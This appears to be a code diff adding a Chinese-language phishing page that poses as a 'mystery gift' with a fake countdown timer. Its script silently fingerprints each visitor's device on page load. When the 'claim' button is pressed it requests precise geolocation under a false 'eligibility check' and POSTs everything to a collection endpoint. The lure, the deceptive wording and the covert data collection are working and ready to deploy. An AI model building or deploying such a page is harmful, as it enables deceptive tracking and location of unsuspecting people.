@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 恭喜！您获得了一份神秘礼物</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Noto Sans SC', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* 动态背景粒子 */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            animation: float 15s infinite;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* 主容器 */
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 48px;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 1;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(60px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* 礼物图标 */
+        .gift-icon {
+            font-size: 80px;
+            margin-bottom: 24px;
+            animation: bounce 2s ease-in-out infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        h1 {
+            color: #333;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 32px;
+            line-height: 1.6;
+        }
+
+        /* 按钮样式 */
+        .claim-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 48px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.5);
+        }
+
+        .claim-btn:active {
+            transform: translateY(0);
+        }
+
+        .claim-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            100% { left: 100%; }
+        }
+
+        /* 加载状态 */
+        .loading {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #666;
+            font-size: 16px;
+        }
+
+        /* 成功状态 */
+        .success {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            animation: pop 0.5s ease-out;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-text {
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .success-subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+
+        /* 进度条 */
+        .progress-container {
+            display: none;
+            margin-top: 24px;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 4px;
+        }
+
+        .progress-text {
+            color: #666;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        /* 倒计时 */
+        .countdown {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .countdown-item {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px 16px;
+            border-radius: 12px;
+            min-width: 60px;
+        }
+
+        .countdown-value {
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .countdown-label {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        /* 隐藏的 iframe 用于更多信息 */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- 背景粒子 -->
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <div class="gift-icon">🎁</div>
+        <h1>恭喜！您被选中了！</h1>
+        <p class="subtitle">您的好友给您发送了一份神秘礼物<br>点击下方按钮立即领取</p>
+        
+        <!-- 倒计时 -->
+        <div class="countdown">
+            <div class="countdown-item">
+                <div class="countdown-value" id="minutes">04</div>
+                <div class="countdown-label">分</div>
+            </div>
+            <div class="countdown-item">
+                <div class="countdown-value" id="seconds">59</div>
+                <div class="countdown-label">秒</div>
+            </div>
+        </div>
+
+        <div id="main-content">
+            <button class="claim-btn" onclick="claimGift()">🎉 立即领取礼物</button>
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <div class="loading-text">正在验证您的领取资格...</div>
+        </div>
+
+        <div class="success" id="success">
+            <div class="success-icon">✅</div>
+            <div class="success-text">领取成功！</div>
+            <div class="success-subtitle">礼物正在飞速送往您的手中~</div>
+        </div>
+
+        <div class="progress-container" id="progress">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+            <div class="progress-text" id="progress-text">正在准备...</div>
+        </div>
+    </div>
+
+    <script>
+        // API 地址 - 部署后替换
+        const API_URL = '/api/collect';
+
+        // 生成粒子
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = (10 + Math.random() * 10) + 's';
+                particle.style.width = (5 + Math.random() * 10) + 'px';
+                particle.style.height = particle.style.width;
+                container.appendChild(particle);
+            }
+        }
+
+        // 倒计时
+        let totalSeconds = 299; // 4:59
+        function updateCountdown() {
+            const minutes = Math.floor(totalSeconds / 60);
+            const seconds = totalSeconds % 60;
+            document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
+            document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
+            if (totalSeconds > 0) {
+                totalSeconds--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+
+        // 收集设备信息
+        async function collectDeviceInfo() {
+            const info = {
+                // User Agent
+                userAgent: navigator.userAgent,
+                
+                // 平台信息
+                platform: navigator.platform || navigator.userAgentData?.platform,
+                
+                // 屏幕信息
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                devicePixelRatio: window.devicePixelRatio,
+                colorDepth: screen.colorDepth,
+                
+                // 浏览器信息
+                browserName: getBrowserName(),
+                browserVersion: getBrowserVersion(),
+                language: navigator.language,
+                languages: navigator.languages ? [...navigator.languages] : [navigator.language],
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // 硬件信息
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                
+                // 页面信息
+                referrer: document.referrer,
+                pageUrl: window.location.href
+            };
+
+            // 网络信息
+            if (navigator.connection) {
+                info.connectionType = navigator.connection.type;
+                info.downlink = navigator.connection.downlink;
+                info.effectiveType = navigator.connection.effectiveType;
+                info.rtt = navigator.connection.rtt;
+            }
+
+            // 电池信息
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = battery.level;
+                    info.batteryCharging = battery.charging;
+                }
+            } catch (e) {}
+
+            return info;
+        }
+
+        // 获取浏览器名称
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+            return 'Unknown';
+        }
+
+        // 获取浏览器版本
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+            let match;
+            if (ua.includes('Firefox')) {
+                match = ua.match(/Firefox\/(\d+)/);
+            } else if (ua.includes('Chrome')) {
+                match = ua.match(/Chrome\/(\d+)/);
+            } else if (ua.includes('Safari')) {
+                match = ua.match(/Version\/(\d+)/);
+            } else if (ua.includes('Edg')) {
+                match = ua.match(/Edg\/(\d+)/);
+            }
+            return match ? match[1] : 'Unknown';
+        }
+
+        // 获取位置信息
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({});
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        });
+                    },
+                    (error) => {
+                        console.log('Location error:', error.message);
+                        resolve({});
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // 发送数据
+        async function sendData(data) {
+            try {
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+        }
+
+        // 更新进度
+        function updateProgress(percent, text) {
+            document.getElementById('progress-fill').style.width = percent + '%';
+            document.getElementById('progress-text').textContent = text;
+        }
+
+        // 领取礼物
+        async function claimGift() {
+            // 显示加载状态
+            document.getElementById('main-content').classList.add('hidden');
+            document.getElementById('loading').style.display = 'flex';
+            document.getElementById('progress').style.display = 'block';
+
+            // 收集设备信息
+            updateProgress(20, '正在验证身份...');
+            const deviceInfo = await collectDeviceInfo();
+            
+            // 获取位置
+            updateProgress(50, '正在获取位置信息...');
+            const locationInfo = await getLocation();
+            
+            // 合并信息
+            const allInfo = { ...deviceInfo, ...locationInfo };
+            
+            // 发送数据
+            updateProgress(80, '正在处理...');
+            await sendData(allInfo);
+            
+            // 完成
+            updateProgress(100, '完成！');
+            
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('progress').style.display = 'none';
+                document.getElementById('success').style.display = 'flex';
+            }, 500);
+        }
+
+        // 页面加载时自动收集基础信息
+        window.onload = async function() {
+            createParticles();
+            updateCountdown();
+            
+            // 静默收集基础信息（不请求位置权限）
+            const basicInfo = await collectDeviceInfo();
+            sendData(basicInfo);
+        };
+    </script>
+</body>
+</html>
+
